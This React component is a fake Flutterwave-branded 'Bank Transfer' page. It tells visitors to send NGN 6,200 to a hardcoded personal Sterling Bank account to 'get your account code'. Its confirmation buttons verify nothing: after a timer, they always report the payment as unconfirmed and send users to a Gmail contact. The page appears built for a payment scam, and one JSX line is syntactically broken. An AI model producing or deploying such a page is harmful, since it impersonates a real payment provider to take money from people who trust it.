
import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Copy, Check, X } from "lucide-react";
import { toast } from "sonner";
import { Skeleton } from "@/components/ui/skeleton";

const FlutterwaveConfirmation: React.FC = () => {
  const navigate = useNavigate();
  const [paymentStatus, setPaymentStatus] = useState<"loading" | "failed" | "none">("none");
  const [userInfo, setUserInfo] = useState<{ fullName?: string, email?: string }>({});
  
  useEffect(() => {
    // Get user info from session storage
    const userData = sessionStorage.getItem("flutterwave_user");
    if (userData) {
      setUserInfo(JSON.parse(userData));
    }
    
    // Initial state is "none" - showing account details
  }, []);
  
  const handleCopy = (text: string, type: string) => {
    navigator.clipboard.writeText(text);
    toast.success(`${type} copied to clipboard`);
  };
  
  const handlePaymentConfirm = () => {
    setPaymentStatus("loading");
    setTimeout(() => {
      setPaymentStatus("failed");
    }, 4000);
  };
  
  const handleContactSupport = () => {
    window.location.href = "mailto:nobleearn001@gmail.com";
  };

  const handleRecheck = () => {
    setPaymentStatus("loading");
    setTimeout(() => {
      setPaymentStatus("failed");
    }, 4000);
  };
  
  if (paymentStatus === "loading") {
    return (
      <div className="min-h-screen bg-white flex flex-col">
        <div className="bg-gray-200 p-4 flex justify-between items-center">
          <h1 className="text-xl font-bold">Bank Transfer</h1>
          <button 
            onClick={() => navigate(-1)}
            className="text-red-500 font-medium"
          >
            Cancel
          </button>
        </div>
        
        <div className="p-4 flex-1">
          <div className="flex justify-between items-center my-6">
            <div className="w-12 h-12 rounded-full bg-green-800 flex items-center justify-center">
              <span className="text-white">🔄</span>
            </div>
            <div className="text-right">
              <h2 className="text-2xl font-bold">NGN 6,200</h2>
              <p className="text-sm text-gray-500">{userInfo.email || ""}</p>
            </div>
          </div>
          
          <p className="text-center text-lg font-medium my-8">
            Proceed to your bank app to complete this Transfer
          </p>
          
          <div className="flex flex-col items-center justify-center flex-1 mt-20">
            <div className="animate-spin rounded-full h-16 w-16 border-t-4 border-b-4 border-green-800 mb-8"></div>
            <p className="text-xl font-medium">Wait while we confirm your payment...</p>
          </div>
          
          <div className="mt-10">
            <div className="bg-gray-100 p-4 rounded-lg my-2 flex items-center justify-between">
              <p>Payment Made</p>
              <Check size={24} className="text-green-600" />
            </div>
            
            <div className="bg-gray-100 p-4 rounded-lg my-2 flex items-center justify-between">
              <p>Confirming Payment</p>
              <div className="w-6 h-6 rounded-full bg-yellow-500"></div>
            </div>
          </div>
        </div>
      </div>
    );
  }
  
  if (paymentStatus === "failed") {
    return (
      <div className="min-h-screen bg-white flex flex-col">
        <div className="bg-gray-200 p-4 flex justify-between items-center">
          <h1 className="text-xl font-bold">Bank Transfer</h1>
          <button 
            onClick={() => navigate(-1)}
            className="text-red-500 font-medium"
          >
            Cancel
          </button>
        </div>
        
        <div className="p-4 flex-1">
          <div className="flex justify-between items-center my-6">
            <div className="w-12 h-12 rounded-full bg-green-800 flex items-center justify-center">
              <span className="text-white">🔄</span>
            </div>
            <div className="text-right">
              <h2 className="text-2xl font-bold">NGN 6,200</h2>
              <p className="text-sm text-gray-500">{userInfo.email || ""}</p>
            </div>
          </div>
          
          <p className="text-center text-lg font-medium my-8">
            Proceed to your bank app to complete this Transfer
          </p>
          
          <div className="mt-20 text-center">
            <p className="text-xl mb-4">Payment not confirmed, need help? contact email:</p>
            <a href="mailto:nobleearn001@gmail.com" className="text-blue-600 underline">nobleearn001@gmail.com</a>
            
            <button 
              onClick={handleRecheck}
              className="w-full bg-green-700 text-white py-3 rounded-md mt-6"
            >
              Re-check
            </button>
          </div>
        </div>
      </div>
    );
  }
  
  return (
    <div className="min-h-screen bg-white">
      <div className="bg-gray-200 p-4 flex justify-between items-center">
        <h1 className="text-xl font-bold">Bank Transfer</h1>
        <button 
          onClick={() => navigate(-1)}
          className="text-red-500 font-medium"
        >
          Cancel
        </button>
      </div>
      
      <div className="p-4">
        <div className="flex justify-between items-center my-6">
          <div className="w-12 h-12 rounded-full bg-green-800 flex items-center justify-center">
            <span className="text-white">🔄</span>
          </div>
          <div className="text-right">
            <h2 className="text-2xl font-bold">NGN 6,200</h2>
            <p className="text-sm text-gray-500">{userInfo.email || ""}</p>
          </div>
        </div>
        
        <p className="text-center text-lg font-medium my-6">
          Proceed to your bank app to complete this Transfer
        </p>
        
        <div className="bg-gray-50 border rounded-lg p-4 mb-6">
          <div className="mb-4">
            <div className="flex justify-between items-center">
              <div>
                <p className="text-gray-600">Amount</p>
                <p className="text-xl font-bold">NGN 6200</p>
              </div>
              <button 
                onClick={() => handleCopy("6200", "Amount")}
                className="bg-green-700 text-white px-4 py-2 rounded"
              >
                <Copy size={16} className="mr-1 inline" /> Copy
              </button>
            </div>
          </div>
          
          <div className="mb-4">
            <div className="flex justify-between items-center">
              <div>
                <p className="text-gray-600">Account Number</p>
                <p className="text-xl font-bold">01108697498</p>
              </div>
              <button 
                onClick={() => handleCopy("01108697498", "Account Number")}
                className="bg-green-700 text-white px-4 py-2 rounded"
              >
                <Copy size={16} className="mr-1 inline" /> Copy
              </button>
            </div>
          </div>
          
          <div className="mb-4">
            <div>
              <p className="text-gray-600">Bank Name</p>
              <p className="text-xl font-bold"STERLING BANK</p>
            </div>
          </div>
          
          <div>
            <div>
              <p className="text-gray-600">Account Name</p>
              <p className="text-xl font-bold">JUDE SAMUEL</p>
            </div>
          </div>
        </div>
        
        <div className="bg-gray-50 border rounded-lg p-4 mb-6">
          <p className="text-center mb-4">
            Pay to this specific account and get your account code do not use opay bank for your payment 
          </p>
          
          <button
            onClick={handlePaymentConfirm}
            className="w-full bg-green-700 text-white text-center py-4 rounded font-bold"
          >
            I have made this bank Transfer
          </button>
        </div>
      </div>
    </div>
  );
};

export default FlutterwaveConfirmation;
